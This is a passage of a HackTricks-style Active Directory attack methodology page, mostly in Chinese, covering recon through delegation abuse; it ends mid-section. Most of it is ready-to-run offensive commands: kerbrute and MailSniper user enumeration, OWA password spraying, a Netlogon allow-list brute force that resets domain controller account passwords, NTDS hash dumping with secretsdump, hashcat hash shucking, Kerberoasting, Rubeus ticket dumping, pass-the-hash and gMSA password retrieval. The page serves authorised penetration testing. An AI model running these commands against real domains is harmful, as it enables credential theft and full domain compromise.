# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，使**网络管理员**能够在网络中高效地创建和管理**域**、**用户**和**对象**。它经过扩展性设计，可以将大量用户组织到易于管理的**组**和**子组**中，同时控制各个层级的**访问权限**。

**Active Directory** 的结构由三个主要层级组成：**域**、**树**和**林**。**域**包含共享同一数据库的一组对象，例如**用户**或**设备**。**树**是通过共享结构连接起来的一组域，而**林**则是多个树的集合，它们通过**信任关系**相互连接，构成组织结构的最高层级。每个层级都可以指定特定的**访问**和**通信权限**。

**Active Directory** 中的关键概念包括：

1. **目录** – 保存与 Active Directory 对象相关的所有信息。
2. **对象** – 指目录中的实体，包括**用户**、**组**或**共享文件夹**。
3. **域** – 作为目录对象的容器，多个域可以共存于一个**林**中，并且每个域维护自己的对象集合。
4. **树** – 共享同一个根域的一组域。
5. **林** – Active Directory 中组织结构的最高层级，由多个具有**信任关系**的树组成。

**Active Directory Domain Services (AD DS)** 包含一系列对网络中的集中式管理和通信至关重要的服务。这些服务包括：

1. **域服务** – 集中存储数据并管理**用户**与**域**之间的交互，包括**身份验证**和**搜索**功能。
2. **证书服务** – 负责安全**数字证书**的创建、分发和管理。
3. **轻型目录服务** – 通过 **LDAP 协议**支持启用目录的应用程序。
4. **目录联合服务** – 提供**单点登录**功能，使用户可以在单个会话中通过身份验证访问多个 Web 应用程序。
5. **权限管理** – 通过限制受版权保护材料的未经授权分发和使用，帮助保护版权内容。
6. **DNS 服务** – 对**域名**解析至关重要。

如需更详细的解释，请查看：[**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos 身份验证**

要学习如何**攻击 AD**，你需要非常好地**理解****Kerberos 身份验证过程**。\
[**如果你仍然不了解其工作原理，请阅读此页面。**](kerberos-authentication.md)

## Cheat Sheet

你可以访问 [https://wadcoms.github.io/](https://wadcoms.github.io)，快速查看可用于枚举/利用 AD 的命令。

> [!WARNING]
> Kerberos 通信通常**需要完全限定域名 (FQDN)**，以便客户端能够获取正确 SPN 的 ticket。通过 IP 地址访问机器时，通常会回退到 NTLM，而不是 Kerberos。

## Recon Active Directory（无 creds/sessions）

如果你只能访问 AD 环境，但没有任何凭据/session，可以：

- **Pentest 网络：**
- 扫描网络，查找机器和开放端口，并尝试**利用漏洞**或从中**提取凭据**（例如，[打印机可能是非常有趣的目标](ad-information-in-printers.md)）。
- 枚举 DNS 可能会提供域中关键服务器的信息，例如 Web、打印机、共享、VPN、媒体等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用的 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)，以获取有关如何执行此操作的更多信息。
- **检查 smb 服务上的 null 和 Guest 访问**（这在现代 Windows 版本上无法正常工作）：
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 此处提供了更详细的 SMB 服务器枚举指南：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **枚举 Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 此处提供了更详细的 LDAP 枚举指南（请**特别注意匿名访问**）：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **投毒网络**
- 使用 [**Responder 伪装服务**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 收集凭据
- 通过[**滥用 relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)访问主机
- 通过**暴露**[**evil-S 伪造的 UPnP 服务**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 收集凭据
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html)：
- 从域环境内部的文档、社交媒体、服务（主要是 Web）中提取用户名/姓名，也从公开可用的信息中提取。
- 如果你找到了公司员工的完整姓名，可以尝试不同的 AD **用户名约定（**[**阅读此处**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。最常见的约定包括：_NameSurname_、_Name.Surname_、_NamSur_（每个姓名取 3 个字母）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、3 个_随机字母和 3 个随机数字_（abc123）。
- 工具：
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 用户枚举

- **匿名 SMB/LDAP enum：** 查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**：当请求了**无效用户名**时，服务器将使用 **Kerberos error** 代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ 进行响应，这使我们能够判断该用户名无效。**有效用户名**将触发 AS-REP 响应中的 **TGT**，或者返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表明该用户需要执行预身份验证。
- **针对 MS-NRPC 的 No Authentication**：使用 auth-level = 1（No authentication）针对域控制器上的 MS-NRPC（Netlogon）接口。该方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，无需任何凭据即可检查用户或计算机是否存在。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 工具实现了此类枚举。相关研究可在[此处](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>找到。
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

如果你在网络中发现了这类服务器，还可以对其执行 **用户枚举**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper)：
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 你可以在[**此 github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)以及这个 repo（[**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)）中找到用户名列表。
>
> 但是，你应该已经在此前执行的 recon 步骤中获取**公司员工的姓名**。有了姓名和姓氏后，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 生成潜在的有效用户名。

### Netlogon vulnerable-channel allow-list 滥用（Onelogon）

即使 DC 上已经修复了 **Zerologon**，显式加入 allow-list 的账户仍可能暴露于**旧版/易受攻击的 Netlogon secure-channel 行为**。存在风险的配置是 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`**，或对应的注册表值 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**。

该值是一个 **SDDL security descriptor**（参见 [Security Descriptors](security-descriptors.md)）。DACL 中被授予相关 ACE 的任何账户或组都可能成为目标。例如，`O:BAG:BAD:(A;;RC;;;WD)` 实际上会将 **Everyone** 加入 allow-list。

实际 operator 工作流：

1. 通过检查 **SYSVOL/GPO** 和**正在运行的 DC 注册表**，**识别已加入 allow-list 的 principals**。
2. 将 SDDL 中找到的 **SID** 解析为实际的 AD 用户/计算机，并优先处理 **DC machine accounts**、**trust accounts** 以及其他特权计算机。
3. 反复以已加入 allow-list 的账户尝试 **MS-NRPC / Netlogon authentication**。
4. 猜测成功后，滥用 **Netlogon password-setting** 重置目标账户密码（公开 PoC 会将其设置为空字符串）。<sup>[[9]](#references)[[10]](#references)</sup>

来自公开 artifact 的快速分诊 / lab 示例：
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notes:

- The **scanner** is useful because the effective allow-list may exist in **SYSVOL**, in the **registry**, or in both.
- The exploit path itself is important because it **does not require Domain Admin privileges** once a vulnerable account has been identified.
- Compromising a **Domain Controller machine account** such as `DC$` is especially dangerous because resetting that password can directly enable broader **AD takeover** paths.
- **Brute-force feasibility** depends on the mode: the public artifact describes a meet-in-the-middle approach, a **24-bit** brute force when another computer account is available, and slower **32-bit** variants.

Detection / hardening notes:

- Audit the allow-list policy and remove anything except temporary, explicitly required compatibility exceptions.
- Monitor DC **System** events **5827/5828/5829/5830/5831** to catch vulnerable Netlogon connections being denied, discovered, or explicitly allowed by policy.
- Treat accounts in `VulnerableChannelAllowList` as **high-risk** until the legacy dependency is removed.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration provides usernames, email identifiers and naming patterns, candidate hosts, and services that may be coerced into authenticating. Use that context to identify viable NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) and potential paths into the AD environment.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当通过 signing **SMB relay 到 DC 被阻止**时，仍应检查 **LDAP** 的安全状态：`netexec ldap <dc>` 会突出显示 `(signing:None)` / 弱 channel binding。即使 DC 要求 SMB signing，但禁用了 LDAP signing，仍可作为 **relay-to-LDAP** 目标，用于 **SPN-less RBCD** 等滥用。

### Client-side printer credential leaks → 批量域凭据验证

- 打印机/Web UIs 有时会在 HTML 中**嵌入经过掩码处理的管理员密码**。查看源代码或使用 devtools 可能发现明文（例如 `<input value="<password>">`），从而通过 Basic-auth 访问扫描/打印存储库。
- 获取的打印作业可能包含带有每个用户密码的**明文入职文档**。测试时应保持用户名和密码配对关系一致：<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

如果你可以使用 **null 或 guest 用户** **访问其他 PC 或 shares**，就可以**放置文件**（例如 SCF 文件）；如果这些文件被以某种方式访问，就会**触发针对你的 NTLM authentication**，从而可以**窃取** **NTLM challenge** 并进行破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已经持有的每个 NT hash 视为其他较慢格式的候选密码；这些格式的 key material 直接从 NT hash 派生。与其对 Kerberos RC4 tickets、NetNTLM challenges 或 cached credentials 中的长 passphrases 进行 brute-force，不如将 NT hashes 输入 Hashcat 的 NT-candidate modes，让它验证密码复用情况，而无需获知明文。这在 domain compromise 之后尤其有效，因为此时可以收集数千个当前及历史 NT hashes。<sup>[[5]](#references)</sup>

在以下情况下使用 shucking：

- 你从 DCSync、SAM/SECURITY dumps 或 credential vaults 中获得了 NT corpus，并需要测试其是否在其他 domains/forests 中复用。
- 你捕获了基于 RC4 的 Kerberos material（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM responses 或 DCC/DCC2 blobs。
- 你希望快速证明长且无法 crack 的 passphrases 存在复用，并立即通过 Pass-the-Hash 进行 pivot。

该技术**不适用于** key 并非 NT hash 的 encryption types（例如 Kerberos etype 17/18 AES）。如果 domain 强制使用 AES-only，则必须改用常规的 password modes。

#### Building an NT hash corpus

- **DCSync/NTDS** – 使用 `secretsdump.py` 搭配 history，获取尽可能多的 NT hashes（及其历史值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries 会显著扩大候选池，因为 Microsoft 最多可以为每个 account 存储 24 个历史 hashes。有关收集 NTDS secrets 的更多方法，请参阅：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz `lsadump::sam /patch`）会提取 local SAM/SECURITY data 以及 cached domain logons（DCC/DCC2）。去重后，将这些 hashes 追加到同一个 `nt_candidates.txt` 列表中。
- **Track metadata** – 保留生成每个 hash 的 username/domain（即使 wordlist 中只有十六进制字符串）。当 Hashcat 输出成功的 candidate 时，匹配的 hashes 会立即告诉你哪个 principal 正在复用该密码。
- 优先使用来自同一 forest 或 trusted forest 的 candidates；这样可以最大限度地提高 shucking 时发生重叠的概率。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT-candidate inputs **必须保持为原始的 32 位十六进制 NT hashes**。禁用 rule engines（不要使用 `-r`，也不要使用 hybrid modes），因为 mangling 会破坏 candidate key material。
- 这些 modes 本身并不一定更快，但 NTLM keyspace（在 M3 Max 上约为 30,000 MH/s）比 Kerberos RC4（约为 300 MH/s）快约 100 倍。测试经过整理的 NT list，比在慢速格式中探索完整 password space 廉价得多。
- 始终运行**最新的 Hashcat build**（`git clone https://github.com/hashcat/hashcat && make install`），因为 modes 31500/31600/35300/35400 是近期才发布的。<sup>[[7]](#references)</sup>
- 目前没有适用于 AS-REQ Pre-Auth 的 NT mode，而 AES etypes（19600/19700）需要明文密码，因为它们的 keys 通过 PBKDF2 从 UTF-16LE passwords 派生，而不是直接从 NT hashes 派生。

#### Example – Kerberoast RC4 (mode 35300)

1. 使用 low-privileged user 为目标 SPN 捕获 RC4 TGS（详情参见 Kerberoast page）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 使用你的 NT list 对 ticket 执行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 会从每个 NT candidate 派生 RC4 key，并验证 `$krb5tgs$23$...` blob。匹配成功即表示该 service account 使用了你已有的某个 NT hash。

3. 立即通过 PtH 进行 pivot：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

如果需要，可以稍后使用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文。

#### Example – Cached credentials (mode 31600)

1. 从已 compromise 的 workstation 中 dump cached logons：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣的 domain user 的 DCC2 行复制到 `dcc2_highpriv.txt`，然后对其执行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 匹配成功后，会得到列表中已知的 NT hash，证明该 cached user 正在复用密码。可以直接将其用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`），或在快速 NTLM mode 中对其进行 brute-force 以恢复字符串。

完全相同的 workflow 也适用于 NetNTLM challenge-responses（`-m 27000/27100`）和 DCC（`-m 31500`）。识别出匹配项后，你可以发起 relay、SMB/WMI/WinRM PtH，或者在线下使用 masks/rules 重新 crack 该 NT hash。



## 使用 credentials/session 枚举 Active Directory

在此阶段，你需要已经**compromise 了有效 domain account 的 credentials 或 session**。如果你拥有一些有效 credentials，或拥有一个 domain user 的 shell，**应记住之前给出的 options 仍然可以用于 compromise 其他 users**。

开始 authenticated enumeration 之前，请先理解 **Kerberos double-hop problem**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Compromise 一个 account 是**评估 domain 的重要一步**，因为它能够进行 authenticated **Active Directory enumeration**：

关于 [**ASREPRoast**](asreproast.md)，你现在可以找出所有可能存在漏洞的 users；关于 [**Password Spraying**](password-spraying.md)，你可以获得**所有 usernames 的列表**，并尝试使用已 compromise account 的密码、空密码以及其他新的有价值密码。

- 你可以使用 [**CMD 执行基本 recon**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell 进行 recon**](../basic-powershell-for-pentesters/index.html)，这样会更加 stealthier
- 你还可以 [**使用 powerview**](../basic-powershell-for-pentesters/powerview.md) 来提取更详细的信息
- Active Directory 中另一个出色的 recon tool 是 [**BloodHound**](bloodhound.md)。它**并不十分 stealthy**（取决于你使用的 collection methods），但**如果你不在意这一点**，完全应该尝试一下。查找 users 可以在哪里进行 RDP，查找通往其他 groups 的路径等。
- **其他 automated AD enumeration tools 包括：** [**AD Explorer**](bloodhound.md#ad-explorer)**、** [**ADRecon**](bloodhound.md#adrecon)**、** [**Group3r**](bloodhound.md#group3r)**、** [**PingCastle**](bloodhound.md#pingcastle)**。**
- [**AD 的 DNS records**](ad-dns-records.md)，因为其中可能包含有价值的信息。
- 你可以使用 **SysInternal** Suite 中的 **AdExplorer.exe** 这一款带 **GUI** 的 tool 来枚举 directory。
- 你也可以使用 **ldapsearch** 在 LDAP database 中搜索 credentials，检查 _userPassword_ 和 _unixUserPassword_ 字段，甚至检查 _Description_。其他 methods 请参阅 PayloadsAllTheThings 上的 [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)。
- 如果你使用的是 **Linux**，也可以使用 [**pywerview**](https://github.com/the-useless-one/pywerview) 枚举 domain。
- 你还可以尝试以下 automated tools：
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有 domain users**

从 Windows 获取所有 domain usernames 非常简单（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 中，可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即使这个 Enumeration 部分看起来很短，它也是所有内容中最重要的部分。访问这些 links（主要是 cmd、powershell、powerview 和 BloodHound 的 links），学习如何枚举 domain，并持续练习，直到你感到熟练。在 assessment 期间，这是找到通往 DA 的路径，或决定无计可施的关键时刻。

### Predictable pre-created computer accounts -> gMSA password access

为 legacy joins 预先 staged 的 computer accounts 可能保留一个可预测的初始密码。NetExec 的 `pre2k` module 会识别特征性的 `userAccountControl` 值 `4128`（`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`），并使用小写 computer name 的前 14 个字符（不包括末尾的 `$`）尝试获取 Kerberos TGT。应将此 UAC 值视为 candidate selector，而不要假设仅仅属于 **Pre-Windows 2000 Compatible Access** 就能证明密码较弱。<sup>[[18]](#references)[[20]](#references)</sup>

使用 authenticated LDAP enumeration 测试这些 candidates，并保存成功获取的 TGT。`ALL=True` 会将测试范围扩展到默认 `4128` filter 无法匹配的 objects。<sup>[[18]](#references)</sup>
```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```
默认/NTLM bind 失败**并不**会使该发现无效：使用 `-k`、一个可解析到 DC 的 FQDN，以及与 KDC 同步的时钟进行测试。成功的 module 运行会将候选列表和获取的 ccache 写入 `~/.nxc/modules/pre2k/`。<sup>[[18]](#references)[[20]](#references)</sup>

在攻陷 computer principal 后，分析其嵌套组成员关系和出站权限。特别是，gMSA 的 `msDS-GroupMSAMembership` 安全描述符中指定的 principals 可以读取 `msDS-ManagedPassword`；当进行认证的 computer 获得授权后，NetExec 的 `--gmsa` 输出会显示允许的 principals，并返回当前 NT hash。<sup>[[19]](#references)[[20]](#references)</sup>
```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```
然后像检查任何其他凭据一样评估恢复的 gMSA：检查本地/域组成员身份、登录权限、SPN、delegation 以及可访问的服务，然后再尝试 pass-the-hash。此基于 ACL 的检索路径不同于 [Golden gMSA/dMSA](golden-dmsa-gmsa.md)，后者是在 KDS root-key compromise 后派生 managed passwords。<sup>[[20]](#references)</sup>

### Kerberoast

Kerberoasting 涉及获取由与用户帐户关联的服务使用的 **TGS tickets**，并对其加密进行破解——该加密基于用户密码——整个过程在 **offline** 状态下进行。

更多相关信息：

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

获取一些凭据后，可以检查是否有权访问任何 **machine**。为此，可以根据端口扫描结果，使用 **CrackMapExec** 尝试通过不同协议连接多台服务器。

### Local Privilege Escalation

如果你获得了已 compromise 的凭据，或者拥有普通域用户的会话，并且可以访问域中的**任何 machine**，就应寻找一条在本地**提升权限并收集凭据**的路径。本地 administrator 权限可能允许你从内存（LSASS）和本地存储（SAM）中 **dump 其他用户的 hashes**。

本书中有完整页面介绍 [**Windows 中的 local privilege escalation**](../windows-local-privilege-escalation/index.html)，以及一份[**checklist**](../checklist-windows-privilege-escalation.md)。另外，别忘了使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### Current Session Tickets

你**不太可能**在当前用户的 **tickets** 中找到**允许你访问**意外资源的权限，但仍可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

拥有域凭据或用户会话后，重新进行 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)：经过身份验证的枚举和 coercion 技术可能会暴露出在未认证侦察期间不可用的 relay 路径。

### 在计算机共享 | SMB 共享中查找凭据

现在你已经拥有一些基本凭据，应检查是否能在 **AD 内部找到**任何**正在共享的有价值文件**。你可以手动完成，但这是一项非常枯燥且重复的任务（尤其是当你找到数百份需要检查的文档时）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

如果你能**访问其他 PC 或共享**，就可以**放置文件**（例如 SCF 文件）；如果这些文件被以某种方式访问，就会**触发针对你的 NTLM authentication**，这样你就可以**窃取** **NTLM challenge** 并对其进行破解：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

此漏洞允许任何经过身份验证的用户**入侵域控制器**。


{{#ref}}
printnightmare.md
{{#endref}}

## Active Directory 中使用特权凭据/会话进行权限提升

**对于以下技术，普通域用户并不足够，你需要某些特殊权限/凭据才能执行这些攻击。**

### Hash extraction

希望你已经通过 [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括 relaying）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) 或[在本地提升权限](../windows-local-privilege-escalation/index.html)，设法**入侵了某个本地管理员**账户。\
接下来，是时候转储内存中以及本地存储的所有哈希了。\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**一旦获得某个用户的哈希**，就可以用它来**冒充**该用户。\
你需要使用某种**工具**，通过该**哈希执行** **NTLM authentication**，或者可以创建新的 **sessionlogon** 并将该**哈希注入** **LSASS**，这样每当执行 **NTLM authentication** 时，就会使用该**哈希**。后一种方式就是 mimikatz 的工作方式。\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

此攻击旨在**使用用户的 NTLM 哈希请求 Kerberos tickets**，作为通过 NTLM protocol 执行常规 Pass The Hash 的替代方案。因此，在**禁用 NTLM protocol 且仅允许使用 Kerberos** 作为 authentication protocol 的网络中，这种方式尤其**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者会**窃取用户的 authentication ticket**，而不是其密码或哈希值。随后使用该窃取的 ticket **冒充用户**，从而未经授权访问网络中的资源和服务。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

如果你拥有某个**本地管理员**的 **hash** 或 **password**，应尝试使用它**登录**其他 **PC**。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 请注意，这种方式相当**嘈杂**，而 **LAPS** 可以**缓解**这一问题。

### MSSQL Abuse & Trusted Links

如果用户拥有**访问 MSSQL 实例**的权限，他可能能够利用该权限在 MSSQL 主机上**执行命令**（如果以 SA 身份运行）、**窃取** NetNTLM **哈希**，甚至执行 **relay** **攻击**。\
如果某个 MSSQL 实例通过数据库链接受到另一个实例的信任，则拥有链接数据库权限的用户可能能够**利用信任关系在另一个实例上执行查询**。这些信任关系可以串联起来，最终可能到达一个配置错误的数据库，使用户能够执行命令。\
**数据库之间的链接即使跨越 forest trust 也能正常工作。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 资产/部署平台滥用

第三方清单和部署套件通常会暴露通往凭据和代码执行的强大路径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你发现某个 Computer 对象具有 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性，并且你在该计算机上拥有域权限，那么你将能够从内存中导出登录该计算机的每个用户的 TGT。\
因此，如果 **Domain Admin 登录到该计算机**，你将能够导出其 TGT，并使用 [Pass the Ticket](pass-the-ticket.md) 冒充该用户。\
借助 constrained delegation，你甚至可以**自动攻陷 Print Server**（希望它会是 DC）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许使用 "Constrained Delegation"，它将能够**冒充任意用户以访问计算机上的某些服务**。\
因此，如果你**攻陷**该用户/计算机的**哈希**，你将能够**冒充任意用户**（甚至是 domain admins）以访问某些服务。


{{#ref}}
